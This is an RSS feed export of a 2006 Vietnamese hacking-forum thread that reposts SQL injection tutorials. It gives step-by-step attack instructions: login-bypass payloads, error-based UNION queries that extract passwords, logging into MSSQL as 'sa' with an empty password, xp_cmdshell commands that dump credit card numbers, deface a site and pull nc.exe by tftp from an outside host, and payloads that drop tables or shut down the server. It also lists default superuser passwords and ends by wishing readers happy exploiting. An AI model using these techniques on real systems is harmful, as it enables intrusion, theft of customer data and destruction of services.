@@ -1,0 +1,679 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "SQL Injection Tutorial - Sưu tầm của HVA cũ"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "SQL Injection Tutorial - Sưu tầm của HVA cũ"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>SQL Injection Tutorial - Sưu tầm của HVA cũ</title>
+				<description><![CDATA[ //*********************************************************//
+//**************SQL INJECTION **************//
+//*********************************************************//
+
+//********************//
+//*******INTRO:*******//
+//********************//
+• 
+Hầu hết các chương trình ứng dụng web mới đều dựa trên cấu trúc dữ liệu động để để đạt được tính hấp dẫn của các chương trình desktop cổ điển. Cơ chế động này đạt được bằng cách thu thập dữ liệu từ 1 database. Một trong những nền database phổ biến hơn cả trong các ứng dụng e-shop là SQL. Rất nhiều các ứng dụng web chỉ dựa hoàn toàn vào những scripts ở đầu vào ( phía người dùng - client ), những đoạn scripts này chỉ đơn giản là truy vấn 1 SQL database nằm ở ngay trên webserver hay nằm trên 1 hệ thống đầu cuối ( phía server ) riêng biệt. Một trong những cách tấn công khó bị nhận thấy và nguy hiểm nhất lên 1 ứng dụng web bao gồm việc chiếm đoạt những chuỗi truy vấn được dùng bởi các scripts, để đoạt quyền điểu khiển ứng dụng đó hoặc các dữ liệu của nó. Một trong những cơ chế hiệu quả nhất để đạt được điều đó là một kỹ thuật gọi là SQL injection ( kỹ thuật chèn những câu lệnh SQL )
+
+//********************//
+//*****CONTENTS:******//
+//********************//
+
+Cơ sở dữ liệu là trái tim của một website thương mại. Một cuộc tấn công vào server lưu giữ CSDL có thể gây ra thất thoát lớn về tài chính cho công ty. Thông thường CSDL bị hack để lấy các thông tin về thẻ tín dụng. Chỉ cần một cuộc tấn công sẽ làm giảm uy tín và lượng khách hàng bởi vì họ muốn thông tin về CC của mình được an toàn. Hầu hết các website thương mại dùng Microsoft SQL (MSSql) và Oracle. MSSQL vẫn đang chiếm ưu thế trên thị trường vì giá thành rẻ. Trong khi Oracle server được bán mắc hơn. Oracle đã từng tuyên bố là "không thể xâm nhập được", nhưng những hacker coi đó như là 1 lời thách thức và đã tìm ra rất nhiều lỗi trong Oracle server.. 
+
+Bài viết được chia làm 2 phần 
+1. Dùng HTTP cổng 80
+2. Dùng MS SQL cổng 1434
+
+Phần 1 - Dùng cổng 80 HTTP
+----------------------------------------------------------------
+
+Kiến thức trong phần này hữu ích không chỉ đối với các hacker mà còn với những người thiết kế web. Chỉ cần một lỗi thông thường tạo ra bởi người thiết kế web có thể làm lộ thông tin về CSDL của server cho hacker. Toàn bộ mục đích của trò chơi là các chuỗi truy vấn. Người đọc coi như có kiến thức về các truy vấn và ngôn ngữ asp ( active server pages ). Thêm nữa là cách tấn công này thường chỉ cần dùng bằng 1 trình duyệt internet. Vì vậy bạn không cần bất cứ một tool nào ngoại trừ IE hay Netscape. 
+
+Thông thường, để làm 1 trang đăng nhập, người thiết kế web sẽ viết 1 đoạn mã như sau:
+
+login.htm
+
+<html>
+<body>
+<form method=get action="logincheck.asp">
+<input type="text" name="login_name">
+<input type="text" name="pass">
+<input type="submit" value="sign in">
+</form>
+</body>
+</html>
+
+File logincheck.asp nằm trên server dùng để kiểm tra thông tin do user nhập vào có nội dung:
+
+logincheck.asp
+
+<@language="vbscript">
+<%
+dim conn,rs,log,pwd
+log=Request.form("login_name")
+pwd=Request.form("pass")
+
+set conn = Server.CreateObject("ADODB.Connection")
+conn.ConnectionString="provider=microsoft.jet.OLEDB.4.0;data source=c:\folder\multiplex.mdb"
+conn.Open
+set rs = Server.CreateObject("ADODB.Recordset")
+rs.open "Select * from table1 where login='"&log& "' and password='" &pwd& "' ",conn
+If rs.EOF
+response.write("Login failed")
+else
+response.write("Login successful")
+End if
+%>
+
+Thoạt tiên đoạn code trên có vẻ ổn. 1 người dùng type username và pass trong trang login.htm và click 'Submit'. Giá trị được type vào sẽ được browser chuyển về cho logincheck.asp kiểm tra bằng cách dùng câu truy vấn "Select * from table1 where login='"&log& "' and password='" &pwd& "' ". 
+Mọi thứ có vẻ OK ? Chuỗi truy vấn cũng OK. Nhưng nếu 1 trang login được làm như thế thì 1 hacker sẽ có thể dễ dàng đăng nhập mà không cần một password hợp lệ nào đó. Nhìn lại chuỗi truy vấn:
+
+"Select * from table1 where login='"&log& "' and password='" &pwd& "' "
+
+Nếu 1 user type tên đăng nhập là "hack" và mật khẩu là "passne" thì những giá trị này sẽ được chuyển cho trang asp với method "POST" và câu truy vấn trên trở thành:
+
+"Select * from table1 where login=' hack' and password=' passne ' "
+
+Tốt. Nếu như có 1 dòng chứ login name "hack" và password "passne" trong CSDL thì chúng ta sẽ nhận được thông báo đăng nhập thành công. Nhưng nếu như type loginname là "hack" và password là hi' or 'a'='a' trong phần password ? Câu truy vấn sẽ trở thành:
+
+"Select * from table1 where login=' hack' and password=' hi' or 'a'='a ' "
+
+Click 'Submit' và Bingo, đăng nhập thành công. Chuỗi truy cập được thoả mãn khi điều kiện là password bằng 'hi' HOẶC 'a'='a'. Điều này luôn đúng và hacker sẽ đăng nhập với nick 'hack'. Có thể thử các chuỗi sau đây trong ô password nếu cách trên không làm được với một số website:
+
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+
+Dấu -- được thêm vào làm cho phần còn lại của chuỗi truy vấn trở thành 'chú thích' nên các điều kiện khác sẽ không bị kiểm tra. Tương tự có thể dùng:
+hack' --
+hack" --
+
+hoặc những username khác và chọn lựa password bất kỳ để có thể đăng nhập được. Bởi vì trong câu truy vấn chỉ có phần username được kiểm tra là 'hack' và phần còn lại bị bỏ đi do có dấu -- . Nếu may mắn gặp được vào những website mà người thiết kế web đã mắc những lỗi trên, và bạn có thể login với bất kỳ username nào.
+
+Cách tấn công cao cấp hơn: dùng các thông báo lỗi của ODBC
+--------------------------------------------------------------
+
+Theo trên ta có thể thấy cách login mà không cần phải biết bất cứ 1 password nào. Dưới đây là cách để đọc toàn bộ CSDL chỉ bằng cách dùng các truy vấn trong URL. Cách này chỉ thực hiện được đối với IIS servers, nghĩa là với các trang asp. Và IIS được sử dụng trong gần 35% các ứng dụng thương mại web. Vì vậy chắc chắn bạn sẽ tìm ra 1 nạn nhân sau khi chỉ search một vài website. Thí dụ như:
+<span class="link"> http://www.nosecurity.com/mypage.asp?id=45</span>
+
+trong URL, dấu '?' cho thấy đằng sau nó, giá trị 45 sẽ được chuyển cho 1 thông số ẩn. Chúng ta hãy xem lại ví dụ trên, trang login.htm có 2 form input dạng text tên là 'login_name' và 'pass', và các giá trị của 2 form này sẽ được chuyển cho logincheck.asp
+
+Việc đăng nhập thành công cũng có thể thực hiện bằng cách mở trực tiếp trang logincheck.asp bằng cách dùng link:http://www.nosecurity.com/logincheck.asp?login_name=hack&pass=passne nếu method là GET thay vì POST ( save html lại và sửa POST bằng GET )
+
+Lưu ý: sự khác nhau giữa GET và POST là POST sẽ không hiện ra các giá trị được chuyển sang trang sau trên URL trong khi GET làm hiện lên các giá trị này. Để biết thêm về GET và POST nên đọc thêm RFC 1945 và 2616 trong giao thức HTTP
+
+Sau dấu '?' thì các biến được dùng trong trang logincheck.asp sẽ được gán bằng giá trị hacker type vào. Trong URL trên thì login_name sẽ được gán với giá trị hack. Các giá trị khác nhau được ngăn cách bởi dấu '&'
+Quay trở lại trang index.htm, biến id có thuộc tính ẩn và tuỳ theo những link người dùng click, giá trị của id sẽ thay đổi. Giá trị này sẽ được chuyển vào trong câu truy vấn mypage.asp và user sẽ được trả về trang mình muốn. Ứng với giá trị của 'id' là 46 sẽ có một trang khác.
+
+Chúng ta bắt đầu hack: type thêm vào trên URL câu truy vấn sau:<span class="link"> http://www.nosecurity.com/mypage.asp?id=45</span> UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
+
+information_schema.tables là một table hệ thống chứa thông tin về tất cả table của server. Trong đó có một field table_name chứa tất cả tên của các table. Chuỗi query SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES trả về giá trị là tên của table đầu tiên với kiểu string (nvarchar) trong INFORMATION_SCHEMA.TABLES, và chúng ta lại gộp nó 45 là một giá trị số. Vì vậy server sẽ thông báo lỗi: 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'logintable' to a column of data type int. /mypage.asp, line
+
+Trong thông báo lỗi trên ta nhận được một table là 'logintable'. Table này có thể chứa tên truy cập và password của các user. Tiếp tục type câu lệnh sau lên URL:
+<span class="link"> http://www.nosecurity.com/mypage.asp?id=45</span> UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='logintable'--
+
+Tương tự table_name, column_name cũng là 1 field trong table hệ thống INFORMATION_SCHEMA.COLUMNS chứa tất cả tên các column. Và ta đang gộp tên của column đầu tiên trong table 'logintable' với giá trị 45, nên sẽ có thông báo lỗi:
+
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'login_id' to a column of data type int. /index.asp, line 5
+
+Thông báo lỗi cho thấy column đầu tiên trong 'logintable' là 'login_id', để lấy tên của column thứ 2:
+<span class="link"> http://www.nosecurity.com/mypage.asp?id=45</span> UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='logintable' WHERE COLUMN_NAME NOT IN ('login_id')--
+
+Output:
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'login_name' to a column of data type int. /index.asp, line 5
+
+Chúng ta có thêm 1 column nữa là 'login_name', tiếp tục lấy column thứ 3
+<span class="link"> http://www.nosecurity.com/mypage.asp?id=45</span> UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='logintable' WHERE COLUMN_NAME NOT IN ('login_id','login_name')--
+
+Output:
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'passwd' to a column of data type int. /index.asp, line 5
+
+Đây là thông tin ta cần có: password login. Bước kế tiếp là lấy thông tin login và password từ table 'logintable', type;
+<span class="link"> http://www.nosecurity.com/mypage.asp?id=45</span> UNION SELECT TOP 1 login_name FROM logintable--
+
+Output:
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'Rahul' to a column of data type int. /index.asp, line 5
+
+Đây rồi: 1 trong những login name là 'Rahul', câu lệnh lấy password của user Rahul sẽ là:<span class="link"> http://www.nosecurity.com/mypage.asp?id=45</span> UNION SELECT TOP 1 password FROM logintable where login_name='Rahul'--
+
+Output:
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'P455w0rd' to a column of data type int. /index.asp, line 5
+OK, tên truy cập : Rahul và mật khẩu là p455w0rd. Ta đã crack được CSDL của www.nosecurity.com. Và điều này nhờ vào server đã không lọc dữ liệu truy vấn của người dùng. Lỗi SQL này vẫn còn gặp ở nhiều website, và phương pháp phòng chống tốt nhất là phân tích những request của user và lọc đi các ký tự như ', ", --, : ....
+
+Phần 2: dùng cổng 1434 ( cổng giao tiếp SQL )
+------------------------------------------------------
+
+Chúng ta đã thấy cách làm thế nào để xâm nhập vào CSDL bằng cách dùng các malformed URL và chỉ bằng cổng 80 ( cổng http ). Sau đây ta sẽ hack database dùng port 1434. Trước khi hack chúng ta nên biết thật sự các database server là gì và hoạt động như thế nào, cùng với cách khai thác chúng.
+
+Những người thiết kết MS SQL tạo ra một số thủ tục mặc định được lưu sẵn chung với sản phẩm của mình để giúp cho webdesigner linh động hơn. Các thủ tục này không có gì khác mà chính là các lớp hàm, được dùng để thực hiện những nhiệm vụ nào đó dựa trên các biến được truyền cho chúng. Chính những thủ tục này rất quan trọng đối với hacker, 1 số trong đó gồm:
+sp_passsword -> đổi password cho 1 tên truy cập (login name) nào đó
+VD: EXEC sp_password ‘oldpass’, ‘newpass’, ‘username’
+
+sp_tables -> hiển thị tất cả table trong database hiện tại
+VD: EXEC sp_tables
+
+xp_cmdshell -> cho phép chạy câu lệnh bất kỳ lền server với quyền admin của database ( cái này quan trọng nhất, vì thông thường database được cài mặc định với quyền root )
+
+xp_msver -> hiển thị version của SQL server và tất cả thông tin về HĐH được sử dụng. 
+
+xp_regdeletekey -> xoá một key trong registry của windows
+xp_regdeletevalue -> xoá một giá trị trong registry
+xp_regread -> in 1 giá trị trong registry lên màn hình
+xp_regwrite -> gán 1 giá trị mới cho 1 key
+xp_terminate_process -> ngừng một process nào đó
+
+Đây là một số các lệnh quan trọng. Thật ra có hơn 50 loại thủ tục như thế. Nếu muốn database được an toàn thì điều nên làm là xoá tất cả những thủ tục đó đi bằng cách mở Master database dùng chương trình MS SQL Server Enterprise Manager. Mở folder Extended Stored Procedures và xoá các thủ tục lưu trong đó bằng cách nhấn chuột phải và chọn delete
+
+Lưu ý:"Master" là một database quan trọng của SQLchứa tất cả thông tin về hệ thống như là login name và các thủ tục có sẵn. Nếu 1 hacker xoá master database thì SQL server sẽ bị down vĩnh viễn. Ngoài "Master" db ra còn có "Syslogins" là table hệ thống mặc định chứ tất cả username và password để login vào db ( user của db khác user của ứng dụng web ). Điều nguy hiểm nhất trong MS SQL là MS SQL mặc định có một user là "sa" với password "" ( không có pass )
+
+Tiếp theo là cách hack db. Đầu tiên ta cần tìm ra một server bị lỗi. Download 1 chương trình scan port và scan 1 dãy ip để tìm ip có port 1433 hoặc 1434 ( tcp hay udp ) mở. Đây là port dùng bởi MS SQL server. Ngoài ra port của Oracle server là 1512. VD như chúng ta tìm được một server có ip là 198.188.178.1, có rất nhiều cách để dùng các dịch vụ của SQL như là dùng telnet hoặc netcat tới port 1433/1434. Ngoài ra có thể dùng một tool tên là osql.exe được kèm theo với các SQL server 2000. Mở DOS prompt và type vào:
+C:>osql.exe -?
+osql: unknown option ?
+usage: osql [-U login id] [-P password]
+[-S server] [-H hostname] [-E trusted connection]
+[-d use database name] [-l login timeout] [-t query timeout]
+[-h headers] [-s colseparator] [-w columnwidth]
+[-a packetsize] [-e echo input] [-I Enable Quoted Identifiers]
+[-L list servers] [-c cmdend]
+[-q "cmdline query"] [-Q "cmdline query" and exit]
+[-n remove numbering] [-m errorlevel]
+[-r msgs to stderr] [-V severitylevel]
+[-i inputfile] [-o outputfile]
+[-p print statistics] [-b On error batch abort]
+[-O use Old ISQL behavior disables the following]
+<EOF> batch processing
+Auto console width scaling
+Wide messages
+default errorlevel is -1 vs 1
+[-? show syntax summary]
+
+Đây là help file cho osql. Tiếp tục:
+C:\> osql.exe –S 198.188.178.1 –U sa –P “”
+Nếu chung ta nhận được dấu nhắc
+1>
+có nghĩa là login thành công, nếu không sẽ có thông báo lỗi login sai đối với user "sa"
+
+Tới đây nếu ta muốn chạy bất kỳ câu lệnh nào đó lên server, chỉ cần dùng thủ tục "xp_cmdshell" như sau:
+
+C:\> osql.exe –S 198.188.178.1 –U sa –P “” –Q “exec master..xp_cmdshell ‘dir >dir.txt’”
+
+Tôi khuyến khích việc dùng -Q thay vì -q bởi vì chúng ta sẽ exit khỏi server ngay sau khi câu lệnh được thực hiện. Tương tự ta có thể chạy bất cứ một câu lệnh nào lên server. Một hacker thông minh còn có thể install backdoor nhằm để tiếp tục access vào server sau này. Ta cũng có thể dùng “information_schema.tables” để lấy list các tables và nội dung của chúng bằng cách:
+
+C:\> osql.exe –S 198.188.178.1 –U sa –P “” –Q “select * from information_schema.tables”
+
+Kiếm thông tin login trong các table như login, accounts, users ... 
+C:\> osql.exe –S 198.188.178.1 –U sa –P “” –Q “select * from users”
+
+và lấy thông tin về username cùng với credit card.
+
+C:\> osql.exe –S 198.188.178.1 –U sa –P “” –Q “select username, creditcard, expdate from users”
+
+Output:
+
+Username creditcard expdate
+----------- ------------ ----------
+Jack 5935023473209871 2004-10-03 00:00:00.000
+Jill 5839203921948323 2004-07-02 00:00:00.000
+Micheal 5732009850338493 2004-08-07 00:00:00.000
+Ronak 5738203981300410 2004-03-02 00:00:00.000
+
+Có thể deface website bằng cách chạy lệnh sau ( chỉ trong trường hợp database server được install chung với webserver )
+
+C:\> osql.exe –S 198.188.178.1 –U sa –P “” –Q “exec master..xp_cmdshell ‘echo defaced by hack> C:\inetpub\wwwroot\index.html’”
+
+Upload file lên server dùng tftp:
+C:\> osql.exe –S 198.188.178.1 –U sa –P “” –Q “exec master..xp_cmdshell ‘tftp 203.192.16.12 GET nc.exe c:\nc.exe’”
+
+Để download một file nào đó ta có thể dùng lệnh PUT thay vì GET, bởi vì các câu lệnh này sẽ được thực hiện trên server chứ không fải ở máy chúng ta. Nếu ta dùng GET, câu lệnh sẽ thực hiện trên server và sẽ download nc.exe từ máy của chúng ta tới server.
+
+Tools dùng hack các SQL pass có rất nhiều trên web. Ngay cả lỗi tràn bộ đệm cũng có thể được dùng để điêu khiển hoàn toàn một hệ thống với quyền admin. Bài viết này chỉ đề cập một số vấn đề tổng quát về db server.
+
+• Remember the Sapphire worm? Which was released on 25th Jan. The worm which exploited three known vulnerabilities in the SQL servers using 1433/1434 UDP ports.
+
+Phương pháp phòng chống
+---------------------------
+
+<*> Đổi password mặc định của user "sa"
+<*> Xoá tất cả các thủ tục được mặc định lưu trữ trên server
+<*> Lọc những ký tự như ',",--,: ...
+<*> Update SQL với những bản mới nhất
+<*> Khoá các port SQL bằng cách dùng firewall
+
+Một số website về SQL security"<span class="link"> http://sqlsecurity.com</span><span class="link"> http://www.cert.com</span>
+
+Any comments and good criticism is always accepted at guatehack@linuxmail.org
+
+[End of Original Message]
+
+1. Một số password default cho các super-user:
+Oracle sys: oracle
+
+mySQL (Windows) root:null
+
+MS SQL Server sa:null
+
+DB2 dlfm:ibmdb2
+2. Collection các tool dùng cho SQL: 
+SQLTools.zip ---------> www.lebuudan.net/SQLTools.zip
+Bao gồm:
+SQLcracker + passlist + userlist
+SQLdos.exe
+SQLscanner.exe
+SQLping.exe
+and more.
+
+3.OSQL.exe nằm trong bộ MSDE của microsoft, nhưng tới 64Mb lận, có ai cần thì tui upload lên. Hông thì thui, host nhỏ xíu hà.
+
+4. ebook/text : 
+ebook:<span class="link"> http://www.hackersplayground.org/books.html</span>
+text:<span class="link"> http://www.hackersplayground.org/papers.html</span>
+SQLinjection:<span class="link"> http://www.hackersplayground.org/papers.html</span> 
+
+Chúc khai thác vui vẻ ! 
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/382.hva#910</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/382.hva#910</link>
+				<pubDate><![CDATA[Sun, 25 Jun 2006 22:48:14]]> GMT</pubDate>
+				<author><![CDATA[ BigballVN]]></author>
+			</item>
+			<item>
+				<title>Re: SQL Injection Tutorial - Sưu tầm của HVA cũ</title>
+				<description><![CDATA[ SQL Injection là gì ? 
+
+Cơ sở dữ liệu(database) được coi như là "trái tim" của hầu hết các website. Nó chứa đựng những dữ liệu cần thiết để website có thể chạy và lưu trữ các thông tin phát sinh trong quá trình chạy. Nó cũng lưu trữ những thông tin cá nhân , thẻ tín dụng , mật khẩu của khách hàng , của user và thậm chí là cả của Administrator. Hơn cả thế nữa , database còn lưu trữ cả những chi tiết về hoá đơn mua hàng , chi tíêt hàng hoá...Đó chính là lý do mà việc bảo vệ Database của 1 website lại rất quan trọng để bảo vệ quyền lợi khách hàng, vận hành việc kinh doanh 1 cách hiệu quả. 
+
+Nhưng điều gì xảy ra khi bạn nhận ra rằng những dữ liệu đó không an toàn. Điều gì sẽ xảy ra khi bạn nhận ra rằng có 1 lỗi bảo mật mới được phát hiện ? Bạn sẽ trả lời ngay rằng bạn sẽ tìm kiếm 1 phiên bản sữa lổi (patch) hoặc nâng cấp ứng dụng lên version mới hơn. Nhưng bạn sẽ không ngờ rằng ,còn có 1 loại lỗi khác không thể nào trông chờ vào việc sửa chữa của hãng viết softwares vì lỗi này phát sinh là do...chính bạn. Lỗi SQL Injection (Chèn lệnh SQL).
+
+SQL Injection là gì ?
+Ngày nay các ứng dụng SQL ngày càng trở nên thân thiện hơn và dễ sử dụng hơn. Nhưng theo qui tắc bảo mật, cái gì càng dễ sử dụng và càng nhiều tính năng thì càng dễ bị tấn công và điều này hoàn toàn đúng với 1 số phiên bản của ngôn ngữ SQL mà tôi sẽ mô tả sau đây bằng 2 công nghệ thông dụng nhất hiện nay , ngôn ngữ ASP và Ms.SQL server.
+
+Như bạn đã biết, ngôn ngữ SQL (Structured Query Language) thông thường là sự kết hợp của những lệnh như SELECT , UPDATE hay INSERT... Như với SELECT, sau mỗi lệnh là sự trả về 1 số data cần thiết, vd như
+
+
+CODE  
+SELECT * FROM Users WHERE userName = 'justin'; 
+
+
+
+Định nghĩa WHERE userName = 'justin' có nghĩa rằng chúng ta múôn biết tất cả các thông tin (*) về username có tên là justin. Bởi vì ngôn ngữ SQL gần với câu nói tự nhiên , dễ hiểu như vậy nên nó đã nhanh chóng được tiếp nhận và nó cũng mở ra cơ hội cho việc khai thác lỗi SQL Injection bằng cách "nói thêm". 
+
+Bằng cách chèn thêm 1 vài dòng vào , hackers có thể gây ra sự nhầm lẫn của server và thực hiện 1 ý đồ khác ngoài mục tiêu của chương trình. Hãy xem xét ví dụ sau:
+
+Thông thường , để kiểm tra đăng nhập 1 user, đa số website sẽ cung cấp 1 form như sau:
+
+CODE  
+<form name="frmLogin" action="login.asp" method="post"> 
+Username: <input type="text" name="userName"> 
+Password: <input type="text" name="password"> 
+<input type="submit"> 
+</form> 
+
+
+
+Khi users nhấn nút Submit, website lập tức chuyển data đến files login.asp qua hàm Request.Form . Sau đó , 1 câu SQL sẽ được thực hiện để xác định danh tính user này. Chúng ta có thể tạo 1 files login.asp như sau:
+
+
+CODE  
+<% 
+dim userName, password, query 
+dim conn, rS 
+
+userName = Request.Form("userName") 
+password = Request.Form("password") 
+
+set conn = server.createObject("ADODB.Connection") 
+set rs = server.createObject("ADODB.Recordset") 
+
+query = "select * from users where userName='" & 
+userName & "' and userPass='" & password & "'" 
+
+conn.Open "Provider=SQLOLEDB; Data Source=(local); 
+Initial Catalog=myDB; User Id=sa; Password=" 
+rs.activeConnection = conn 
+rs.open query 
+
+if not rs.eof then 
+response.write "Logged In" 
+else 
+response.write "Bad Credentials" 
+end if 
+%> 
+
+
+
+Và sau đó , hãy tạo 1 database mẫu như sau:
+
+
+CODE  
+create database myDB 
+go 
+
+use myDB 
+go 
+
+create table users 
+( 
+userId int identity(1,1) not null, 
+userName varchar(50) not null, 
+userPass varchar(20) not null 
+) 
+
+insert into users(userName, userPass) values('admin', 'wwz04ff')
+insert into users(userName, userPass) values('john', 'doe') 
+insert into users(userName, userPass) values('fsmith', 'mypassword') 
+
+
+
+Nào , bây giờ nếu chúng ta nhập vào user:john và password:doe , thì câu SQL sẽ như thế này:
+
+
+CODE  
+select count(*) from users where userName='john' and userPass='doe' 
+
+
+
+Boom, chúng ta login được vào trong vì câu query hoàn toàn đúng và User John cùng với password là hiện hữu. Hãy dừng lại 1 chút ở đây , bạn hãy xem kỹ có phải bạn cũng đã làm như vậy đối với website của bạn và nó...không có lỗi. Nếu bạn trả lời là đúng , hãy đọc tiếp...Điều gì xảy ra nếu Hackers điền vào form như thế này:
+
+User:john
+password:' or 1=1 --
+
+Câu query trở thành
+
+
+CODE  
+select * from users where userName='john' and 
+userPass='' or 1=1 --' 
+
+
+
+Ms.SQL qui định tất cả những gì theo sau "--" đều là câu chú thích (Giống như dấu // trong C++) , do đó câu query bây giờ sẽ:
+
+1. Kiểm tra xem có username là john hay không ? --> Có
+2. Kiểm tra xem 1 = 1 đúng hay không ? --> Đúng
+3. Sau -- là chú thích , không quan tâm. --> Đúng
+
+Vì cả 3 điều kiện đều là đúng nên bạn sẽ login được vào tài khoản của john một cách dễ dàng mà không cần biết password của anh ta. 2 dấu -- để ở cuối câu SQL dùng để loại bỏ thông báo lỗi của MS.SQL vì còn 1 dấu ngoặc đơn (quote) của câu SQL chính thức.
+
+Nào , bây giờ xem chúng ta có thể khai thác được gì nhiều hơn từ "chiêu" đơn giản này ? Bạn hãy nhìn lên Table Users mà bạn vừa tạo lúc nãy. Trong hầu hết các hệ thống , users cấp cao nhất (Administrator) thường là user được tạo ra đầu tiên và một biện pháp an toàn cơ bản là không bao giờ lấy tên User là Administrator , nhưng có hề gì nếu ta nhập vào:
+
+Username: ' or 1=1 --- 
+Password: [Bất cứ cái gì]
+
+Câu SQL trở thành
+
+CODE  
+select * from users where userName='' or 1=1 
+--' and userPass='' 
+
+
+
+Và boom , bạn đã trở thành Administrator và có mọi quyền hành để điều khiển website.
+
+Việc nhập vào form của 1 website để khai thác lỗi SQL Injection là cách thường thấy nhất. Phần sau tôi sẽ hướng dẫn bạn 1 số cách khắc phục , nhưng trước hết chúng ta hãy xem thêm 1 vài ví dụ về khai thác lỗi SQL Injection ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/382.hva#911</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/382.hva#911</link>
+				<pubDate><![CDATA[Sun, 25 Jun 2006 22:50:12]]> GMT</pubDate>
+				<author><![CDATA[ BigballVN]]></author>
+			</item>
+			<item>
+				<title>SQL Injection Tutorial - Sưu tầm của HVA cũ</title>
+				<description><![CDATA[ Ví dụ 1:
+Microsoft SQL phát triển riêng cho mình 1 cách viết lệnh SQL mới , còn gọi là Transact SQL, hay TSQL. Tôi sẽ sử dụng sức mạnh của TSQL để mô tả về cách thức tấn công SQL Injection. Hãy dựa vào câu SQL mà chúng ta đang xem xét. Giả sử tôi nhập vào :
+
+Username: ' having 1=1 --- 
+Password: [Anything]
+
+Câu SQL trở thành
+
+CODE  
+select userName from users where userName='' having 1=1 
+
+
+
+Và ngay lập tức , Ms.SQL báo lỗi và gửi trả về màn hình trang web:
+
+Microsoft OLE DB Provider for SQL Server (0x80040E14)
+Column 'users.userName' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.
+
+/login.asp, line 16
+
+Nhìn kỹ lại thông báo và chúng ta thấy rằng Ms.SQL đã để lộ 2 thông tin cho người dùng vô danh (ở đây là chúng ta đang thử khai thác lỗi SQL Injection) là tên của 1 Field và tên của Table mà chúng ta đang muốn xâm nhập , field "users.userName" . Sử dụng tên có được này chúng ta dùng cú pháp LIKE :
+
+Username: ' or users.userName like 'a%' --- 
+Password: [Anything]
+
+và câu SQL trở thành
+
+CODE  
+select userName from users where userName='' or 
+users.userName like 'a%' --' and userPass='' 
+
+
+
+Câu SQL này thu thập tất cả những users có Username bắt đầu là "a" và trong trường hợp này là admin
+
+Logged In As admin
+
+Ví dụ 2:
+Ngôn ngữ SQL qui định dấu ';' là kết thúc 1 câu query và sau dấu ';' là một câu query mới. Ví dụ như
+select 1; select 1+2; select 1+3; sẽ thực hiện cả 3 câu query. Lợi dụng điều này , ta hãy làm như sau:
+
+Username: ' or 1=1; drop table users; -- 
+Password: [Anything]
+
+Và ...phù, toàn bộ dữ liệu về users của website biến mất.
+
+Ví dụ 3:
+Trong ví dụ này tôi sẽ cho bạn thấy việc khai thác sự tiện lợi của TSQL có thể làm biến mất Database hoặc thậm chí shutdown luôn IIS. Chúng ta sẽ xem xét 1 số lệnh đặc biệt của Ms.SQL và phần "stored procedures". Đa số website khi kết nối với Database thường sử dụng account sa(default system account) để kết nối từ ASP đến Ms.SQL. Mặc định , account sa có toàn quyền , bao gồm delete, rename, và thêm vào database, table , triggers....
+
+Nào bây giờ chúng ta hãy nhập vào:
+
+Username: '; shutdown with nowait; -- 
+Password: [Anything]
+
+Một trong những lệnh "nguy hiểm" nhất của Ms.SQL là SHUTDOWN WITH NOWAIT . Khi nhận lệnh này , toàn bộ server Ms.SQL ngừng hoạt động hoàn toàn và chỉ restart và làm việc lại khi được ra lệnh bằng tay từ trình SQL service manager , hoặc tab Services của Windows. Và khi bạn nhập vào như trên , câu SQL trở thành
+
+
+CODE  
+select userName from users where userName=''; 
+shutdown with nowait; --' and userPass='' 
+
+
+
+Nếu website sử dụng account sa và bị khai thác lỗi như trên , nó sẽ dừng hoàn toàn phần Database từ 1giây cho đến vài ngày , dừng đến khi nào có người phát hiện ra là nó đã bị dừng và khởi động nó lại bằng tay.
+
+SQL Server cũng có sẵn (Includes) một vài thủ tục (stored procedures) được viết bằng C++ DLL. Những thủ tục này được dùng để vận hành SQL Server một cách dễ dàng như đọc thư mục , registry , xóa files, chạy 1 dòng lệnh command... Toàn bộ stored procedures thường bắt đầu bằng "xp_". Có 1 vài stored procedures có thể gây nguy hiểm cho server. Hãy xem xét , giả sử IIS chạy cùng server với SQL server và chúng ta nhập vào:
+
+Username: '; exec master..xp_cmdshell 'iisreset'; -- 
+Password: [Anything]
+
+Câu lệnh SQL trở thành
+
+
+CODE  
+select userName from users where userName=''; 
+exec master..xp_cmdshell 'iisreset'; --' and userPass='' 
+
+
+
+Ngạc nhiên chưa ? Sau khi SQL Server biến mất thì bây giờ toàn bộ website biến mất !!!
+
+Ví dụ 4:
+Bây giờ, chúng ta sẽ chuyển qua 1 thứ mà chúng ta thường gặp hơn. Thông thường khi vào những website thương mại , bạn thường thấy URL có dạng như sau:
+
+www.mysite.com/products.asp?productId=2
